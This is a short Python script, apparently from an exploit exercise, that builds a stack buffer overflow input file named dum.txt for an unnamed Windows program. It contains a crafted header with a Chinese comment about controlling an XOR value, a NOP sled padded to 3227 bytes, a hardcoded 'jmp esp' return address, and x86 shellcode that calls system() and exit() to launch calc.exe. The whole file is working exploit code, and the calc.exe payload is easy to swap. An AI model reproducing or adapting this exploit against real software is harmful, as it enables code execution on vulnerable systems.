#!/usr/bin/python3
import struct
import sys
import ctypes
shellcode = ""

shellcode += "\xC4\x0C\x00\x00"

shellcode += "\xEF\xDF\x01\x03"
shellcode += "\xF3\xAB\xB5\x92"  # 用于控制异或值为12345678h

shellcode += "\x90"*(3227-len(shellcode)) # nops for stack length
print(len(shellcode))
shellcode += "\x5F\x06\x9F\x75" # jmp esp address


shellcode +=(
      "\xEB\x17\x5E\x33\xC0\x88\x46\x08\x8B\xDE\x53\xBB"
      "\x60\x0A\xF5\x75" # system address
      "\xFF\xD3\xBB"
      "\x60\x2F\xEB\x75" # exit address 
      "\xFF\xD3\xE8\xE4\xFF\xFF\xFF\x63\x61\x6C\x63\x2E\x65\x78\x65\x64\x64\x64"
)  # shellcode from bin
print(len(shellcode))

shellcode=shellcode.encode('latin-1')

shellcode = bytearray(shellcode)
# Save the binary code to file
with open('dum.txt', 'wb') as f:
  f.write(shellcode)
